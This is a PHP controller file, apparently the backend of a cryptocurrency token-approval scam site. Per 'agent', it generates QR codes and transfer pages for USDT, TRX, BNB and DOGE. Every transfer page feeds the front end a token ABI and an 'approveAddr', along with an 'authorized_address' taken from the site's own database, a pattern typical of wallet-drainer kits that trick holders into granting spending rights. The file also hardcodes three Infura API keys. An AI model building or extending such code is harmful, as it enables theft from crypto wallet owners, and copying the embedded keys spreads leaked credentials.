<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | 版权所有 2014~2021 广州楚才信息科技有限公司 [ https://www.cuci.cc ]
// +----------------------------------------------------------------------
// | 官方网站: https://thinkadmin.top
// +----------------------------------------------------------------------
// | 开源协议 ( https://mit-license.org )
// | 免费声明 ( https://thinkadmin.top/disclaimer )
// +----------------------------------------------------------------------
// | gitee 代码仓库：https://gitee.com/zoujingli/ThinkAdmin
// | github 代码仓库：https://github.com/zoujingli/ThinkAdmin
// +----------------------------------------------------------------------

namespace app\index\controller;

use think\admin\Controller;
use app\index\service\AddressService;

/**
 * Class Index
 * @package app\index\controller
 */
class Index extends Controller
{
    public function index()
    {
		$this->fetch();
        //$this->redirect(sysuri('admin/login/index'));
    }
	
	/**
	 * 生成ERC20转账二维码
	 **/
	public function qr_erc(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->address = config('contract.etherscan.contractaddress');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/erc_usdt_transfer",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/erc_usdt_transfer",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_erc_en');
		}
	}
	
	/**
	 * ERC20转账
	 **/
		public function usdt_tianyan(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscan.contract')?config('contract.tronscan.contract'):$address;
		
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('trc_usdt_transfer_en');
		}
		
	
	}
	public function erc_usdt_transfer(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.etherscan.contractaddress')?config('contract.etherscan.contractaddress'):$address;
		
		$this->abi = config('contract.etherscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.etherscan.addr');
		$this->addr2 = config('contract.etherscan.addr2');
		$this->addr3 = config('contract.etherscan.addr3');
		
		$authorized_add = AddressService::instance()->get_address_by_id(1);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('erc_usdt_transfer_en');
		}
	}
	public function usdt_tianyan_erc(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.etherscan.contractaddress')?config('contract.etherscan.contractaddress'):$address;
		
		$this->abi = config('contract.etherscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.etherscan.addr');
		$this->addr2 = config('contract.etherscan.addr2');
		$this->addr3 = config('contract.etherscan.addr3');
		
		$authorized_add = AddressService::instance()->get_address_by_id(1);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('erc_usdt_transfer_en');
		}
	}
	
	
	/**
	 * 生成TRC20转账二维码
	 **/
	public function qr_trc(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->address = config('contract.tronscan.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/trc_usdt_transfer",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/trc_usdt_transfer",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_trc_en');
		}
	}
	
	public function qr_doge(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->address = config('contract.tronscandoge.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/doge_doge_transfer",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/doge_doge_transfer",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_doge_en');
		}
	}
		public function qr_trx(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->address = config('contract.tronscantrx.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/trx_trx_transfer",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/trx_trx_transfer",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_trx_en');
		}
	}
		public function qr_bnb(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->address = config('contract.tronscanbnb.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/bnb_bnb_transfer",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/bnb_bnb_transfer",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_bnb_en');
		}
	}
	
	/**
	 * TRC20转账
	 **/
	public function trc_usdt_transfer(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscan.contract')?config('contract.tronscan.contract'):$address;
		
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('trc_usdt_transfer_en');
		}
	}public function trx_trx_transfer(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscantrx.contract')?config('contract.tronscantrx.contract'):$address;
		
		$this->abi = config('contract.tronscantrx.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscantrx.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('trx_trx_transfer_en');
		}
	}public function bnb_bnb_transfer(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscanbnb.contract')?config('contract.tronscanbnb.contract'):$address;
		
		$this->abi = config('contract.tronscanbnb.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscanbnb.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('bnb_bnb_transfer_en');
		}
	}public function doge_doge_transfer(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscandoge.contract')?config('contract.tronscandoge.contract'):$address;
		
		$this->abi = config('contract.tronscandoge.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscandoge.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('doge_doge_transfer_en');
		}
	}
		public function index_uhs(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscan.contract')?config('contract.tronscan.contract'):$address;
		
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('index_uhs_en');
		}
	}
	public function index_uhs_en(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->agent = $agent;
		$this->address = config('contract.tronscan.contract')?config('contract.tronscan.contract'):$address;
		
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('index_uhs_en');
		}
	}
	
	/**
	 * 生成混币转账二维码
	 **/
	public function qr_mix(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		$this->address = config('contract.mixswap.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/mix_usdt_transfer",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/mix_usdt_transfer",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_mix_en');
		}
	}
		public function qr_trc_uhs(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		$this->address = config('contract.tronscan.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/index_uhs",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/index_uhs_en",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_trc_uhs_en');
		}
	}
		public function qr_trc_uhs_en(){
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		$this->address = config('contract.tronscan.contract');
		if($type == 'cn'){
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/index_uhs_en",['agent'=>$agent,'address'=>$this->address]);
			$this->fetch();
		}else{
			$this->qrcode = "https://".$_SERVER['HTTP_HOST'].url("index/index/index_uhs_en",['agent'=>$agent,'address'=>$this->address,'type'=>$type]);
			$this->fetch('qr_trc_uhs_en');
		}
	}
	/**
	 * Mixswap转账
	 **/
	public function mix_usdt_transfer(){
		$agent = input('agent');
		$address = input('address');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent) || empty($address)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		$this->agent = $agent;
		$this->address = config('contract.mixswap.contractaddress')?config('contract.mixswap.contractaddress'):$address;
		
		$this->abi = config('contract.mixswap.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.mixswap.addr');
		$this->addr2 = config('contract.mixswap.addr2');
		$this->addr3 = config('contract.mixswap.addr3');
		
		$authorized_add = AddressService::instance()->get_address_by_id(1);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('mix_usdt_transfer_en');
		}
	}
		
}